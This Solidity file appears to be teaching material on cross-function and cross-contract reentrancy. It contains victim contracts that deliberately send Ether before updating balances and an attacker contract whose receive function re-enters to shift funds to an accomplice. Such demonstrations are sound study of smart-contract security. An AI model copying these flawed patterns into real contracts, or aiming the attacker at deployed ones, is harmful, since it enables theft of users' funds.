// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.18;

/**
 * @notice type 2 CROSS-FUNCTION REENTRANCY
 *
 * see contract #25 Reentrancy Ether for type 1
 *
 * Exploits: a vulnerable function within a contract shares the state (balances)
 * with another function that benefits the attacker (transfer)
 *
 * Result: the attacker gets his money back but in the meantime
 * it also assign its balance value to the accomplice
 *
 *
 * @notice type 3 CROSS-CONTRACT REENTRANCY
 * NOTE send() and transfer() are safe against reentrancy
 */
import {ReentrancyGuard} from "@openzeppelin/contracts/utils/ReentrancyGuard.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";

/**
 * -------------------------------------------------------------------------------------
 * 1. Victim contract First Cross Attack: Cross Function
 * -------------------------------------------------------------------------------------
 */

contract ReentrancyVictimFunction {
    error ReentrancyVictim_balanceIsLow();
    error ReentrancyVictim_callFailed();

    mapping(address => uint256) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function transfer(address to, uint256 amount) external {
        // double spending
        if (balances[msg.sender] >= amount) {
            //1 ether
            //sender is the attacker
            //it's still 1 ether, balances has not been updated yet!
            balances[msg.sender] -= amount; // attacker has 0 ether
            balances[to] += amount; // attacker has 1 ether
        }
    }

    /**
     * Identical as in contract 25
     */
    function withdraw() public {
        uint256 userBalance = balances[msg.sender];
        // 1) Check
        if (userBalance == 0) {
            revert ReentrancyVictim_balanceIsLow();
        }
        // 2) Interacion
        (bool success,) = msg.sender.call{value: userBalance}(""); //this triggers the fallback function in the receiver
        if (!success) {
            revert ReentrancyVictim_callFailed();
        }
        // 3) Effect
        balances[msg.sender] = 0;
    }

    function getBalances(address user) public view returns (uint256) {
        return balances[user];
    }
}

/**
 * -------------------------------------------------------------------------------------
 * 2. Victim contract Second Cross Attack: Cross Contract
 *
 * Vulnerabe shared variables: Pokemon s_pokemonAmount, ETH s_pokemonAmount
 * -------------------------------------------------------------------------------------
 */

/**
 * @notice The PokemonGym is owned by the Victim contract
 * Vu
 */
contract PokemonGym is Ownable {
    mapping(address => uint256) public s_pokemonAmount;

    error Pokemon_NotEnoughPokemon();

    constructor() Ownable(msg.sender) {}

    function transferPokemonFrom(address _from, address _to, uint256 _amount)
        external
        notEnoughPokemon(_from, _amount)
        returns (bool)
    {
        s_pokemonAmount[_from] -= _amount;
        s_pokemonAmount[_to] += _amount;
        return true;
    }

    function catchOnePokemon(address _owner) external onlyOwner returns (bool) {
        s_pokemonAmount[_owner] += 1;
        return true;
    }

    function releaseAllPokemon(address _owner) external onlyOwner returns (bool) {
        s_pokemonAmount[_owner] -= s_pokemonAmount[_owner];
        return true;
    }

    function balanceOf(address _owner) external returns (uint256) {
        return s_pokemonAmount[_owner];
    }

    modifier notEnoughPokemon(address _from, uint256 _amount) {
        if (s_pokemonAmount[_from] < _amount) {
            revert Pokemon_NotEnoughPokemon();
        }
        _;
    }
}

contract ReentrancyVictimContract is ReentrancyGuard {
    error ReentrancyVictimContract_notEnoughEthers();
    error ReentrancyVictimContract_notEnoughPokemon();

    mapping(address => uint256) public pokemon;
    PokemonGym pokemonGym;

    constructor() {
        pokemonGym = new PokemonGym();
    }

    /*
    * @notice The user buys 1 pokemon for 0.1 ether (mint)
    */
    function buyOnePokemon() external payable notEnoughEthers(msg.value) {
        pokemonGym.catchOnePokemon(msg.sender);
    }

    /* 
     * @notice the user gets his money back then the pokemon are released (burn)
     *
     * @dev The reentrancy guard does not prevent the attack
     * Bad use of CEI > burn is after sending tokens (CIE)
     * 
     * The receive function in the attacker will trigger the transfer to the accomplice
     * because the shared variable (s_pokemonAmount) is updated after the sending of ETH
     * 
     */

    function sellAllPokemon() external payable nonReentrant notEnoughPokemon {
        //! call will fail if no receive function exists in the receiving contract (attacker)
        (bool success,) = msg.sender.call{value: msg.value}("");
        require(success, "Failed to send back Ether to pokemon owner"); //revert is more gas efficient

        pokemonGym.releaseAllPokemon(msg.sender);
    }

    function transferPokemonFrom(address _from, address _to, uint256 _amount) public returns (bool) {
        return pokemonGym.transferPokemonFrom(_from, _to, _amount);
    }

    function balanceOf(address user) public returns (uint256) {
        return pokemonGym.balanceOf(user);
    }

    modifier notEnoughEthers(uint256 value) {
        if (value < 1 ether) {
            revert ReentrancyVictimContract_notEnoughEthers();
        }
        _;
    }

    modifier notEnoughPokemon() {
        if (pokemonGym.balanceOf(msg.sender) == 0) {
            //vulnerable function
            revert ReentrancyVictimContract_notEnoughPokemon();
        }
        _;
    }
}

/**
 * -------------------------------------------------------------------------------------
 * 3. Attacker contract for both Reentrancy Cross attacks
 * -------------------------------------------------------------------------------------
 */

contract ReentrancyAttacker {
    ReentrancyVictimFunction immutable victimFunction;
    ReentrancyVictimContract immutable victimContract;
    address immutable accomplice;
    CrossAttackType currentAttackType;

    enum CrossAttackType {
        FUNCTION,
        CONTRACT
    }

    error ReentrancyAttacker_sendingNotEnoughEthers();

    constructor(address _victimFunction, address _victimContract, address _accomplice) {
        victimFunction = ReentrancyVictimFunction(_victimFunction);
        victimContract = ReentrancyVictimContract(_victimContract);
        accomplice = _accomplice;
    }

    function attack(CrossAttackType attackType) external payable {
        currentAttackType = attackType;
        if (msg.value < 1 ether) revert ReentrancyAttacker_sendingNotEnoughEthers();
        if (attackType == CrossAttackType.FUNCTION) {
            victimFunction.deposit{value: msg.value}();
            victimFunction.withdraw(); // calls a receive / fallback
        }
        if (attackType == CrossAttackType.CONTRACT) {
            victimContract.buyOnePokemon{value: msg.value}();
            victimContract.sellAllPokemon(); // calls a receive / fallback
        }
    }

    receive() external payable {
        // the attacker's amount has not yet been removed/burn: he can transfer it to evil carl
        if (currentAttackType == CrossAttackType.FUNCTION) {
            if (address(victimFunction).balance >= msg.value) {
                victimFunction.transfer(accomplice, 1 ether);
            }
        }
        if (currentAttackType == CrossAttackType.CONTRACT) {
            if (address(victimContract).balance >= msg.value) {
                victimContract.transferPokemonFrom(address(this), accomplice, 1);
            }
        }
    }

    function getPokemonAmount(address user) public returns (uint256) {
        return victimContract.balanceOf(user);
    }
}
